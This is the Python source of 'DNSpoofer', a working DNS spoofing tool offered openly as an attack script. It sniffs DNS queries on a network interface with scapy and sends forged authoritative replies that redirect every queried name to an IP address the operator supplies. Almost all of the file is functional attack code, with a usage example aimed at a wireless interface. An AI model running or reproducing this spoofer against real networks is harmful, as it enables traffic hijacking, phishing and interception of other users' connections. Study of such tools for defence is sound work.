#!/usr/bin/python

import platform
import sys
import os

from termcolor import colored

# First of all we need to make sure that the DNSpoofer runs on the linux operating system
if "Linux" not in platform.platform():
    print colored("[Error]>", "red", attrs=["bold"]), colored("Sorry, DNSpoofer only work on linux platforms.", "white", attrs=["bold"])
    sys.exit()

# Make sure that the DNSpoofer is executed in root mode
if os.getuid() != 0:
    print colored("[Error]>", "red", attrs=["bold"]), colored("Sorry, You must run me in root permission.", "white", attrs=["bold"])
    sys.exit()

import subprocess
import logging

from prettytable import PrettyTable
from scapy.all import *
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)


# Globar variable
Table = PrettyTable(["[MACAddress]", "[IPAddress]", "[SRCPort]", "[DSTPort]", "[DNSType]", "[Query]"])



# Clear screen
def Clear_terminal():
    subprocess.call("clear", shell=True)



# Banner
def Display():
    print colored(" ____  _   _ ____                     __           ", "yellow", attrs=["bold"])
    print colored("|  _ \| \ | / ___| _ __   ___   ___  / _| ___ _ __ ", "yellow", attrs=["bold"])
    print colored("| | | |  \| \___ \| '_ \ / _ \ / _ \| |_ / _ \ '__|", "yellow", attrs=["bold"])
    print colored("| |_| | |\  |___) | |_) | (_) | (_) |  _|  __/ |   ", "yellow", attrs=["bold"])
    print colored("|____/|_| \_|____/| .__/ \___/ \___/|_|  \___|_|   ", "yellow", attrs=["bold"])
    print colored("                  |_|                              ", "yellow", attrs=["bold"])
    print colored("[DNSpoofer]>", "magenta", attrs=["bold"]), colored("Is a python dns spoofer", "white", attrs=["bold"])
    print colored("[Coded-by]>", "magenta", attrs=["bold"]), colored("Sha2ow_M4st3r", "white", attrs=["bold"])
    print colored("[Contact]>", "magenta", attrs=["bold"]), colored("Sha2ow@protonmail.com", "white", attrs=["bold"])
    print colored("[Github]>", "magenta", attrs=["bold"]), colored("Https://github.com/Sha2ow-M4st3r", "white", attrs=["bold"])
    print colored("[Python-version]>", "magenta", attrs=["bold"]), colored("2.7", "white", attrs=["bold"])
    print colored("[Always says]>", "magenta", attrs=["bold"]), colored("You Can't Run From Your Shadow. But You Can Invite It To Dance", "white", attrs=["bold"])



# Sniffing all incoming and outgoing packets
def Sniffer():
    try:
        while True:
            print colored("\n[Status]>", "green", attrs=["bold"]), colored("Sniffing has begun... [Do not stop the script]", "white", attrs=["bold"])
            sniff(iface=sys.argv[1], filter="udp and dst port 53", prn=DNSpoofer)
    except KeyboardInterrupt:
        print colored("[Error]>", "red", attrs=["bold"]), colored("Script stopped. CTRL+C", "white", attrs=["bold"])
        sys.exit()
    except:
        print colored("[Error]>", "red", attrs=["bold"]), colored("Sniffing was failed", "white", attrs=["bold"])
        sys.exit()



# DNS Spoofing
def DNSpoofer(Packet):
    # Checking dns packet is exist or not
    if Packet.haslayer(DNS):
        # Checking dns query
        if Packet[DNS].qr == 0: # That means request
            print colored("[Status]>", "green", attrs=["bold"]), colored("DNS query was received", "white", attrs=["bold"])

            # Show info
            if Packet[DNS].opcode == 0:
                Opcode = "Request"
            else:
                Opcode = Packet[DNS].opcode
            
            Table.add_row([Packet[Ether].src, Packet[IP].src, Packet[UDP].sport, Packet[UDP].dport, Opcode, Packet[DNS].qd.qname])
            print Table, "\n"
            
            # Making fake dns reply
            DNSReply = IP(dst=Packet[IP].src, src=Packet[IP].dst)/\
                       UDP(dport=Packet[UDP].sport, sport=Packet[UDP].dport)/\
                       DNS(id=Packet[DNS].id, qd=Packet[DNS].qd, aa=1, qr=1, an=DNSRR(rrname=Packet[DNS].qd.qname, ttl=10, rdata=sys.argv[2]))

            try:
                send(DNSReply, verbose=0)
                print colored("[Status]>", "green", attrs=["bold"]), colored("Fake dns reply was sended", "white", attrs=["bold"])
                Table.add_row([Packet[Ether].dst, Packet[IP].dst, Packet[UDP].dport, Packet[UDP].sport, "Reply", sys.argv[2]])
                print Table
            except:
                print colored("[Error]>", "red", attrs=["bold"]), colored("Can't send rogue packet.", "white", attrs=["bold"])
                sys.exit()
        else:
            pass

            
# Use all functions
def Main():
    if len(sys.argv) < 3:
        print colored("[Usage]>", "yellow", attrs=["bold"]), colored("DNSpoofer.py <IFace> <Spoofed server>", "white", attrs=["bold"])
        print colored("[Ex]>", "yellow", attrs=["bold"]), colored("   DNSpoofer.py wlan0 192.168.1.100", "white", attrs=["bold"])
    else:
        Clear_terminal()
        Display()
        Sniffer()


Main()